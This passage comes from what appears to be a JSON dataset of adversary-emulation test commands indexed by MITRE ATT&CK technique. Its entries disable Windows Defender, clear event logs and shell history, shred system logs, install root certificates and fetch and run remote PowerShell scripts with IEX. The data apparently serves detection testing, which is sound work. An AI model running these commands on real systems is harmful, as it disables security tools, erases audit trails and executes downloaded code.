         "description": "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n",
         "command": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
         "command": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
         "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Disable Windows Defender Real-Time Protection",
         "command": "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) {\n  Set-MPPreference -DisableRealtimeMonitoring 1;\n} else {\n  $service = Get-Service WinDefend -ErrorAction SilentlyContinue;\n  if ($service) {\n    if ($service.Status -eq \"Running\") {\n      Stop-Service WinDefend;\n    }\n  } else {\n    echo \"Windows Defender service not found.\";\n    exit 1;\n  };\n};\n"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Ensure the ExecutionPolicy is turned to Bypass",
         "command": "Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\PowerShell -Name ExecutionPolicy -Value ByPass;\n$shell = New-Object -ComObject Wscript.Shell;\nSet-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\");"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Disable Windows Defender All",
         "command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n"
      }
   ],
   "T1070.001": [
      {
         "technique_id": "T1070.001",
         "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
         "tactic": "defense-evasion",
         "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n",
         "command": "wevtutil cl System"
      },
      {
         "technique_id": "T1070.001",
         "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
         "tactic": "defense-evasion",
         "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\""
      },
      {
         "technique_id": "T1070.001",
         "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
         "tactic": "defense-evasion",
         "description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n",
         "command": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}; $logs | ForEach-Object {Clear-EventLog -LogName $_ }; Get-EventLog -list"
      },
      {
         "technique_id": "T1070.001",
         "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
         "tactic": "defense-evasion",
         "description": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]",
         "command": "Clear-Eventlog Security;\nClear-Eventlog System;\n"
      }
   ],
   "T1027.002": [
      {
         "technique_id": "T1027.002",
         "technique_name": "Obfuscated Files or Information: Software Packing",
         "tactic": "defense-evasion",
         "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n",
         "command": "cp 57a8ec_test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin"
      },
      {
         "technique_id": "T1027.002",
         "technique_name": "Obfuscated Files or Information: Software Packing",
         "tactic": "defense-evasion",
         "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n",
         "command": "cp c92729_test_upx /tmp/packed_bin && /tmp/packed_bin"
      },
      {
         "technique_id": "T1027.002",
         "technique_name": "Obfuscated Files or Information: Software Packing",
         "tactic": "defense-evasion",
         "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n",
         "command": "cp 741a31_test_upx /tmp/packed_bin && /tmp/packed_bin"
      },
      {
         "technique_id": "T1027.002",
         "technique_name": "Obfuscated Files or Information: Software Packing",
         "tactic": "defense-evasion",
         "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n",
         "command": "cp cc5b6f_test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin"
      }
   ],
   "T1140": [
      {
         "technique_id": "T1140",
         "technique_name": "Deobfuscate/Decode Files or Information",
         "tactic": "defense-evasion",
         "description": "Use Python to decode a base64-encoded text string and echo it to the console\n",
         "command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"Hello from Atomic Red Team test T1140!\".encode());print(enc.decode())'); python3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"; echo $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"; echo $ENCODED > /tmp/T1140.encoded && python3 -c \"import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())\""
      },
      {
         "technique_id": "T1140",
         "technique_name": "Deobfuscate/Decode Files or Information",
         "tactic": "defense-evasion",
         "description": "Use common shell utilities to decode a hex-encoded text string and echo it to the console\n",
         "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256); printf $ENCODED | xxd -r -p; echo $ENCODED | xxd -r -p; echo $(echo $ENCODED) | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p"
      },
      {
         "technique_id": "T1140",
         "technique_name": "Deobfuscate/Decode Files or Information",
         "tactic": "defense-evasion",
         "description": "Encode/Decode executable\nUpon execution a file named T1140_calc_decoded.exe will be placed in the temp folder\n",
         "command": "certutil -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt && certutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe"
      },
      {
         "technique_id": "T1140",
         "technique_name": "Deobfuscate/Decode Files or Information",
         "tactic": "defense-evasion",
         "description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n",
         "command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp && %temp%\\tcm.tmp -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc2.txt && %temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe"
      },
      {
         "technique_id": "T1140",
         "technique_name": "Deobfuscate/Decode Files or Information",
         "tactic": "defense-evasion",
         "description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n",
         "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64); printf $ENCODED | base64 -d; echo $ENCODED | base64 -d; echo $(echo $ENCODED) | base64 -d; echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d; bash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\""
      },
      {
         "technique_id": "T1140",
         "technique_name": "Deobfuscate/Decode Files or Information",
         "tactic": "defense-evasion",
         "description": "Using Linux Base64 Encoded shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n",
         "command": "echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash"
      },
      {
         "technique_id": "T1140",
         "technique_name": "Deobfuscate/Decode Files or Information",
         "tactic": "defense-evasion",
         "description": "Use Perl to decode a base64-encoded text string and echo it to the console\n",
         "command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));\"); perl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"; echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'; echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,\"<\",\"/tmp/T1140.encoded\");print(decode_base64(<$f>));'"
      }
   ],
   "T1218.010": [
      {
         "technique_id": "T1218.010",
         "technique_name": "Signed Binary Proxy Execution: Regsvr32",
         "tactic": "defense-evasion",
         "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
         "command": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll) ELSE ( C:\\Windows\\system32\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll )"
      },
      {
         "technique_id": "T1218.010",
         "technique_name": "Signed Binary Proxy Execution: Regsvr32",
         "tactic": "defense-evasion",
         "description": "Replicating observed Gozi maldoc behavior registering a dll with an altered extension\n",
         "command": "C:\\Windows\\system32\\regsvr32.exe /s %temp%\\shell32.jpg"
      },
      {
         "technique_id": "T1218.010",
         "technique_name": "Signed Binary Proxy Execution: Regsvr32",
         "tactic": "defense-evasion",
         "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
         "command": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:\"4774cd_RegSvr32.sct\" scrobj.dll"
      },
      {
         "technique_id": "T1218.010",
         "technique_name": "Signed Binary Proxy Execution: Regsvr32",
         "tactic": "defense-evasion",
         "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.",
         "command": "C:\\Windows\\system32\\regsvr32.exe /s /i \"bafdf3_AllTheThingsx86.dll\""
      },
      {
         "technique_id": "T1218.010",
         "technique_name": "Signed Binary Proxy Execution: Regsvr32",
         "tactic": "defense-evasion",
         "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n",
         "command": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll"
      }
   ],
   "T1553.004": [
      {
         "technique_id": "T1553.004",
         "technique_name": "Subvert Trust Controls: Install Root Certificate",
         "tactic": "defense-evasion",
         "description": "Creates a root CA with Powershell\n",
         "command": "$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My; Move-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\""
      },
      {
         "technique_id": "T1553.004",
         "technique_name": "Subvert Trust Controls: Install Root Certificate",
         "tactic": "defense-evasion",
         "description": "Creates a root CA with certutil\n",
         "command": "certutil -addstore my $env:Temp\\rootCA2.cer"
      },
      {
         "technique_id": "T1553.004",
         "technique_name": "Subvert Trust Controls: Install Root Certificate",
         "tactic": "defense-evasion",
         "description": "Creates a root CA with openssl\n",
         "command": "if [ -f rootCA.crt ]; then : ; else if [ ! -f rootCA.key ]; then openssl genrsa -out rootCA.key 4096; fi; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt; fi;  ;  sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"rootCA.crt\""
      },
      {
         "technique_id": "T1553.004",
         "technique_name": "Subvert Trust Controls: Install Root Certificate",
         "tactic": "defense-evasion",
         "description": "The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n",
         "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
      },
      {
         "technique_id": "T1553.004",
         "technique_name": "Subvert Trust Controls: Install Root Certificate",
         "tactic": "defense-evasion",
         "description": "Creates a root CA with openssl\n",
         "command": "openssl genrsa -out rootCA.key 4096; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt; cp rootCA.crt /etc/pki/ca-trust/source/anchors/; update-ca-trust"
      },
      {
         "technique_id": "T1553.004",
         "technique_name": "Subvert Trust Controls: Install Root Certificate",
         "tactic": "defense-evasion",
         "description": "Creates a root CA with openssl\n",
         "command": "if [ -f rootCA.crt ]; then : ; else if [ ! -f rootCA.key ]; then openssl genrsa -out rootCA.key 4096; fi; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt; fi;  ;  mv rootCA.crt /usr/local/share/ca-certificates; echo sudo update-ca-certificates"
      }
   ],
   "T1070.003": [
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Using a space before a command causes the command to not be logged in the Bash History file\n",
         "command": "hostname; whoami"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Prevents Powershell history\n",
         "command": "Set-PSReadlineOption -HistorySaveStyle SaveNothing"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog\n",
         "command": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Clears bash history via cat /dev/null\n",
         "command": "cat /dev/null > ~/.bash_history"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Clears bash history via rm\n",
         "command": "echo \"\" > ~/.bash_history"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Clears bash history via a symlink to /dev/null\n",
         "command": "ln -sf /dev/null ~/.bash_history"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Clears bash history via truncate\n",
         "command": "truncate -s0 ~/.bash_history"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Clears the history of a bunch of different shell types by setting the history size to zero\n",
         "command": "unset HISTFILE; export HISTFILESIZE=0; history -c"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Clears Powershell history\n",
         "command": "Remove-Item (Get-PSReadlineOption).HistorySavePath"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Clears bash history via rm\n",
         "command": "rm ~/.bash_history"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Clears the history and disable bash history logging of the current shell and future shell sessions\n",
         "command": "set +o history; echo 'set +o history' >> ~/.bashrc; . ~/.bashrc; history -c"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "The \"AddToHistoryHandler\" receives the current command as the $line variable and then returns $true if \nthe line should be written to the history file. Here we simply return $false so nothing gets added to \nthe history file for the current session. \n",
         "command": "Set-PSReadLineOption -AddToHistoryHandler { return $false }"
      },
      {
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal on Host: Clear Command History",
         "tactic": "defense-evasion",
         "description": "Stop terminal from logging history",
         "command": "> $HOME/.bash_history && unset HISTFILE\n"
      }
   ],
   "T1222.002": [
      {
         "technique_id": "T1222.002",
         "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n",
         "command": "chmod -R 755 /tmp/AtomicRedTeam/atomics/T1222.002"
      },
      {
         "technique_id": "T1222.002",
         "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Changes a file or folder's ownership and group information using chown.\n",
         "command": "chown"
      },
      {
         "technique_id": "T1222.002",
         "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Changes a file or folder's ownership only recursively using chown.\n",
         "command": "chown -R root /tmp/AtomicRedTeam/atomics/T1222.002"
      },
      {
         "technique_id": "T1222.002",
         "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n",
         "command": "chmod 755 /tmp/AtomicRedTeam/atomics/T1222.002"
      },
      {
         "technique_id": "T1222.002",
         "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n",
         "command": "chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002"
      },
      {
         "technique_id": "T1222.002",
         "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "chowns a file to root using a c script\n",
         "command": "sudo /tmp/T1222002own 2a24e8_chown.c"
      },
      {
         "technique_id": "T1222.002",
         "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Changes a file or folder's ownership and group information recursively using chown.\n",
         "command": "chown -R"
      },
      {
         "technique_id": "T1222.002",
         "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
         "command": "chattr -i /var/spool/cron/root"
      },
      {
         "technique_id": "T1222.002",
         "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Changes a file or folder's ownership only using chown.\n",
         "command": "chown root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml"
      },
      {
         "technique_id": "T1222.002",
         "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n",
         "command": "chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002"
      },
      {
         "technique_id": "T1222.002",
         "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "chmods a file using a c script\n",
         "command": "/tmp/T1222002 /tmp/ T1222002"
      }
   ],
   "T1070.002": [
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test deletes the system log file using osascript via \"do shell script\"(sh/bash by default) which in-turn spawns rm utility, requires admin privileges\n",
         "command": "osascript -e 'do shell script \"rm /var/log/system.log\" with administrator privileges'"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "The first sub-test deletes the journal files using rm utility in the \"/var/log/journal/\" directory and the second sub-test clears the journal by modifiying time period of logs that should be retained to zero.\n",
         "command": "sudo rm /var/log/journal/*; sudo journalctl --vacuum-time=0"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test finds and deletes the system log files within /var/log/ directory using various executions(rm, shred, unlink)\n",
         "command": "sudo find /var/log -name 'system.log.*' -exec rm {} \\; sudo find /var/log/ -name \"system.log.97.gz.*\" -exec shred -u -z -n 3 {} \\; sudo find /var/log/ -name \"system.log.98.gz.*\" -exec unlink {} \\"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test securely deletes the system log files individually and recursively using the srm utility.\nInstall srm using Homebrew with the command: brew install khell/homebrew-srm/srm\nRefer: https://github.com/khell/homebrew-srm/issues/1 for installation\n",
         "command": "sudo srm /var/log/system.log; sudo srm -r /var/log/"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content\n",
         "command": "sudo truncate -s 0 /var/log/system.log; sudo truncate --size=0 /var/log/system.log"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test deletes the system log file using applescript using osascript via Finder application\nNote: The user may be prompted to grant access to the Finder application before the command can be executed successfully as part of TCC(Transparency, Consent, and Control) Framework.\nRefer: https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive\n",
         "command": "osascript -e 'tell application \"Finder\" to delete POSIX file \"/var/log/system.log\"'"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test deletes main log datastore, inflight log data, time-to-live data(TTL), fault and error content\n",
         "command": "sudo log erase --all; sudo log erase --ttl"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n",
         "command": "sudo cat /dev/null > /var/log/system.log; sudo dd if=/dev/zero bs=1000 count=5 of=/var/log/system.log"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test overwrites the contents of the log file with zero bytes(-z) using three passes(-n 3) of data, and then delete the file(-u) securely\n",
         "command": "sudo shred -u -z -n 3 /var/log/system.log"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
         "command": "echo 0> /var/log/secure"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test reads real-time system log file and writes empty string to it, thus clearing the log file without tampering with the logging process\n",
         "command": "sudo log -f /var/log/system.log | : > /var/log/system.log"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test overwrites the contents of system log file with an empty string using echo utility\n",
         "command": "sudo echo '' > /var/log/system.log"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "Delete system and audit logs\n",
         "command": "sudo rm -rf /var/log/system.log; if [ -d /var/audit ] ; then sudo rm -rf /var/audit/20220725213300.202208110700021 ; fi"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
         "command": "echo 0> /var/spool/mail/root"
      },
      {
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
         "tactic": "defense-evasion",
         "description": "This test deletes the system log file using unlink utility\n",
         "command": "sudo unlink /var/log/system.log"
      }
   ],
   "T1553.005": [
      {
         "technique_id": "T1553.005",
         "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
         "tactic": "defense-evasion",
         "description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n",
         "command": "Mount-DiskImage -ImagePath \"C:\\Users\\puma-4\\Desktop\\053c10_AllTheThings.iso\" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel \"AllTheThings\"; $driveLetter = ($keep | Get-Volume).DriveLetter; $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\")); $instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)"
      },
      {
         "technique_id": "T1553.005",
         "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
         "tactic": "defense-evasion",
         "description": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n",
         "command": "Unblock-File -Path C:\\Users\\puma-4\\Desktop\\ReadMe.md"
      },
      {
         "technique_id": "T1553.005",
         "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
         "tactic": "defense-evasion",
